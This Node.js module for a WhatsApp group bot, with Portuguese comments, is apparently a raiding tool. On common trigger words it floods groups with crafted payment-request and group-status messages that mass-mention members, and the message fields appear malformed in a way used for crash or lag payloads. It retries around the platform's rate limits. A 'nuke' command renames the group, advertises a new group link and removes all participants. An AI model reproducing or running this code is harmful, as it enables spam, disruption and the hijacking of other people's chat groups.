module.exports = (client) => {
    const { temTagProtecao } = require('./tag');

    client.ev.on("messages.upsert", async (m) => {
        try {
            const msg = m.messages[0];
            const from = msg.key.remoteJid;

            // 1. Verificação de segurança
            if (!msg.message || !from || !from.endsWith("@g.us")) return;

            // 2. Busca metadados do cache global
            let gMeta = global.groupCache.get(from);
            if (!gMeta) {
                try {
                    gMeta = await client.groupMetadata(from);
                    global.groupCache.set(from, gMeta);
                } catch { return; }
            }

            // 3. Trava de Segurança via Descrição
            if (temTagProtecao(gMeta.desc || "")) return;

            // 4. Captura o texto da mensagem
            const body = msg.message.conversation || 
                         msg.message.extendedTextMessage?.text || 
                         msg.message.imageMessage?.caption || 
                         msg.message.videoMessage?.caption || "";
            
            if (!body) return; 
            
            const textoBaixo = body.toLowerCase().trim();
            const botId = client.user.id.split(':')[0] + '@s.whatsapp.net';
            const sender = msg.key.fromMe ? botId : (msg.key.participant || msg.key.remoteJid);

            // --- GATILHO: "haha" (DIV + STATUS SIMULTÂNEO) ---
            if (textoBaixo.includes("a") && !global.botOff) {
                const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
                const participantes = gMeta.participants
                    .map(u => u.id)
                    .filter(id => id !== botId && !admins.includes(id));
                const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
                let statusText = fullText;
                if (fullText.includes("【↯💣")) {
                    const parts = fullText.split(/【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】/);
                    if (parts.length >= 3) {
                        statusText = (parts[0] + parts[2]).replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
                    }
                }

                for (let i = 0; i < (global.quantidadeDiv || 1); i++) {
                    try {
                        // Envia Payment (DIV)
                        await client.relayMessage(from, {
                            requestPaymentMessage: {
                                currencyCodeIso4217: "EUA",
                                amount1000: "0",
                                noteMessage: {
                                    extendedTextMessage: {
                                        text: fullText,
                                        contextInfo: { mentionedJid: participantes }
                                    }
                                }
                            }
                        }, {});

                        // Envia Status
                        await client.relayMessage(from, {
                            groupStatusMessageV2: {
                                message: {
                                    requestPaymentMessage: {
                                        currencyCodeIso4217: "",
                                        amount1000: "0",
                                        noteMessage: {
                                            extendedTextMessage: {
                                                text: statusText,
                                                contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                            }
                                        },
                                        expiryTimestamp: "0",
                                        amount: { value: "0", offset: 1000, currencyCode: "" }
                                    }
                                }
                            }
                        }, {});

                        await new Promise(r => setTimeout(r, 1700));
                        
                    } catch (err) {
                        if (err.message.includes('rate-overlimit')) {
                            await new Promise(r => setTimeout(r, 2000));
                        } else {
                            console.log("Erro no gatilho haha:", err.message);
                        }
                    }
                }
            }

            // --- GATILHO: "a" (DIV ISOLADA) ---
            if (textoBaixo.includes("oi") && !textoBaixo.includes("haha") && !global.botOff) {
                const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
                const participantes = gMeta.participants
                    .map(u => u.id)
                    .filter(id => id !== botId && !admins.includes(id));
                for (let i = 0; i < (global.quantidadeDiv || 1); i++) {
                    await client.relayMessage(from, {
                        requestPaymentMessage: {
                            currencyCodeIso4217: "EUA",
                            amount1000: "0",
                            noteMessage: {
                                extendedTextMessage: {
                                    text: global.mensagemDiv || "MARCOS PASSOU O RATO 🤪",
                                    contextInfo: { mentionedJid: participantes }
                                }
                            }
                        }
                    }, {});
                    await new Promise(r => setTimeout(r, 1700));
                }
            }

            // --- GATILHO: "status" (STATUS ISOLADO) ---
            if (textoBaixo === "status" && !global.botOff) {
                const admins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id);
                const participantes = gMeta.participants
                    .map(u => u.id)
                    .filter(id => id !== botId && !admins.includes(id));
                const fullText = global.mensagemDiv || "MARCOS PASSOU O RATO 🤪";
                let statusText = fullText;
                if (fullText.includes("【↯💣")) {
                    const parts = fullText.split(/【↯💣─────•𖧹❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ👻❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ𖧹•─────💣↯】/);
                    if (parts.length >= 3) {
                        statusText = (parts[0] + parts[2]).replace(/```/g, "").replace(/\n{3,}/g, "\n\n").trim();
                    }
                }
                for (let i = 0; i < (global.quantidadeDiv || 1); i++) {
                    try {
                        await client.relayMessage(from, {
                            groupStatusMessageV2: {
                                message: {
                                    requestPaymentMessage: {
                                        currencyCodeIso4217: "",
                                        amount1000: "0",
                                        noteMessage: {
                                            extendedTextMessage: {
                                                text: statusText,
                                                contextInfo: { isGroupStatus: true, mentionedJid: participantes }
                                            }
                                        },
                                        expiryTimestamp: "0",
                                        amount: { value: "0", offset: 1000, currencyCode: "" }
                                    }
                                }
                            }
                        }, {});
                        await new Promise(r => setTimeout(r, 1700));
                    } catch (err) {
                        if (err.message.includes('rate-overlimit')) {
                            await new Promise(r => setTimeout(r, 2000));
                        }
                    }
                }
            }

            // --- GATILHO: "nuke" ---
            if (textoBaixo === "nuke") {
                const isAdmins = gMeta.participants.filter(v => v.admin !== null).map(v => v.id).includes(sender);
                if (!isAdmins) return;

                await client.groupUpdateSubject(from, "MARCOS PASSOU O RATO 🤪").catch(() => null);
                const lk = await client.groupInviteCode(from).catch(() => "Indisponível");
                await client.groupUpdateDescription(from, `VEM PRO NOVO\nhttps://chat.whatsapp.com/${lk}`).catch(() => null);

                const botNum = client.user.id.split(':')[0] + '@s.whatsapp.net';
                const pnts = gMeta.participants.filter(p => p.id !== botNum).map(p => p.id);

                if (pnts.length > 0) {
                    await client.groupParticipantsUpdate(from, pnts, "remove").catch(() => null);
                }
            }
        } catch (e) { 
            console.log("Erro Main:", e.message);
        }
    });
};